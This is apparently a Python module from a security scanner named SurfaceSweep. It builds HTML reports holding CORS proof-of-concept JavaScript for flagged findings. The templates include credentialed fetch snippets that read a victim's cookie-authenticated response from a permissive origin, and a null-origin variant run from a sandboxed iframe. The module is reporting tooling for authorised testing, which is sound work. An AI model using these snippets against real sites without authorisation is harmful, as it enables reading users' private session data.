"""
CORS proof-of-concept HTML (Phase 2.2 Step 3).

Generates standalone and in-report PoC snippets for exploitable findings:
  - credentialed reflection (cookies ride along)
  - null-origin (sandboxed iframe)
  - bare reflection / wildcard (no credentials)

Kept under reporting/ so html.py can import it without loading modules.cors
(historical circular-import constraint).
"""

from __future__ import annotations

from html import escape
from typing import Any, Dict, Iterable, List, Optional

POC_SEVERITIES = ("CRITICAL", "HIGH", "MEDIUM")


def primary_origin(finding: Dict[str, Any]) -> str:
    """First flagged Origin for a finding (fallback: finding['origin'])."""
    if finding.get("origin"):
        return str(finding["origin"])
    flagged = finding.get("origins_flagged") or []
    return str(flagged[0]) if flagged else ""


def poc_kind(finding: Dict[str, Any]) -> str:
    """Map a finding to a PoC template key: null | credentialed | reflect."""
    origin = primary_origin(finding)
    acao = str(finding.get("acao") or "")
    acac = str(finding.get("acac") or "").strip().lower() == "true"
    sev = str(finding.get("severity") or "")
    if origin == "null" or acao == "null":
        return "null"
    if acac and sev in ("CRITICAL", "HIGH"):
        return "credentialed"
    if sev in POC_SEVERITIES:
        return "reflect"
    return "info"


def build_poc_js(finding: Dict[str, Any]) -> str:
    """
    JavaScript snippet a tester runs from an allowed Origin.
    Uses only the finding fields — no live network calls from this process.
    """
    kind = poc_kind(finding)
    url = str(finding.get("url") or "")
    origin = primary_origin(finding)
    acao = str(finding.get("acao") or "")

    if kind == "null":
        return (
            "// Origin: null — open a sandboxed iframe (or file:// client).\n"
            "// The iframe's fetch sends Origin: null and receives ACAO=null.\n"
            f"fetch({url!r}, {{ credentials: 'include' }})\n"
            "  .then(r => r.text())\n"
            "  .then(t => console.log('leaked', t.slice(0, 2000)))\n"
            "  .catch(e => console.error('blocked', e));"
        )

    if kind == "credentialed":
        return (
            f"// Host this page at {origin} (must match ACAO={acao or origin}).\n"
            "// Victim session cookies are sent when credentials:'include'.\n"
            f"fetch({url!r}, {{ credentials: 'include', mode: 'cors' }})\n"
            "  .then(r => r.text())\n"
            "  .then(t => document.body.textContent = t.slice(0, 2000))\n"
            "  .catch(e => document.body.textContent = 'Blocked: ' + e);"
        )

    if kind == "reflect":
        return (
            f"// Host this page at {origin}.\n"
            f"fetch({url!r}, {{ mode: 'cors' }})\n"
            "  .then(r => r.text())\n"
            "  .then(t => console.log('read', t.length, 'bytes'));"
        )

    return f"// No PoC for severity={finding.get('severity')} url={url}"


def _finding_title(finding: Dict[str, Any]) -> str:
    sev = str(finding.get("severity") or "")
    url = str(finding.get("url") or "")
    return f"{sev} — {url}"


def build_poc_document(result: Dict[str, Any]) -> str:
    """Standalone HTML page with one section per exploitable CORS finding."""
    cors = result.get("cors") or {}
    findings = [
        f for f in (cors.get("findings") or [])
        if str(f.get("severity") or "") in POC_SEVERITIES
    ]
    target = str(result.get("target") or cors.get("target_origin") or "")
    sections: List[str] = []
    for i, f in enumerate(findings, 1):
        kind = poc_kind(f)
        js = build_poc_js(f)
        sections.append(
            f"<section><h2>{i}. {_escape(_finding_title(f))}</h2>"
            f'<p class="meta">Kind: <code>{_escape(kind)}</code> · '
            f'ACAO: <code>{_escape(str(f.get("acao") or ""))}</code> · '
            f'ACAC: <code>{_escape(str(f.get("acac") or ""))}</code></p>'
            f"<pre><code>{_escape(js)}</code></pre></section>"
        )
    body = "\n".join(sections) or "<p>No exploitable CORS findings.</p>"
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>SurfaceSweep CORS PoC</title>
  <style>
    body {{ font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
           margin: 2rem; background: #0d1117; color: #c9d1d9; }}
    h1, h2 {{ color: #58a6ff; }}
    section {{ border: 1px solid #30363d; border-radius: 6px;
               padding: 1rem; margin: 1rem 0; }}
    pre {{ background: #161b22; padding: 0.75rem; overflow-x: auto;
           border-radius: 4px; }}
    .meta {{ color: #8b949e; font-size: 0.9rem; }}
    code {{ color: #79c0ff; }}
  </style>
</head>
<body>
  <h1>SurfaceSweep — CORS proof-of-concept</h1>
  <p class="meta">Target: <code>{_escape(target)}</code> ·
     Findings with PoC: {len(findings)}</p>
  <p class="meta">Host each snippet from the Origin shown in the comment.
     Authorized testing only.</p>
{body}
</body>
</html>
"""


def write_cors_pocs(result: Dict[str, Any], path: str) -> Optional[str]:
    """
    Write standalone PoC HTML to `path`.
    Returns the path on success, None when there is nothing to write.
    """
    cors = result.get("cors") or {}
    findings = [
        f for f in (cors.get("findings") or [])
        if str(f.get("severity") or "") in POC_SEVERITIES
    ]
    if not findings:
        return None
    from modules.reporting.builder import ensure_parent_dir

    ensure_parent_dir(path)
    html = build_poc_document(result)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(html)
    return path


def _escape(value: str) -> str:
    return escape(str(value), quote=True)


def render_cors_pocs_inline(cors: Dict[str, Any]) -> str:
    """
    Collapsible PoC blocks for the main HTML report (CRITICAL/HIGH only).
    Empty string when nothing to show.
    """
    if not cors:
        return ""
    findings = [
        f for f in (cors.get("findings") or [])
        if str(f.get("severity") or "") in ("CRITICAL", "HIGH")
    ]
    if not findings:
        return ""
    blocks = []
    for f in findings:
        kind = poc_kind(f)
        js = build_poc_js(f)
        title = _escape(_finding_title(f))
        blocks.append(
            "<details style=\"margin:0.4rem 0;\">"
            f"<summary style=\"cursor:pointer;color:#8b949e;\">"
            f"PoC · {title} · <code>{_escape(kind)}</code></summary>"
            f"<pre style=\"margin-top:0.4rem;\"><code>{_escape(js)}</code></pre>"
            "</details>"
        )
    return (
        '<h3 style="margin:1rem 0 0.35rem;color:#8b949e;font-size:0.95rem;">'
        "Proof of concept</h3>" + "".join(blocks)
    )
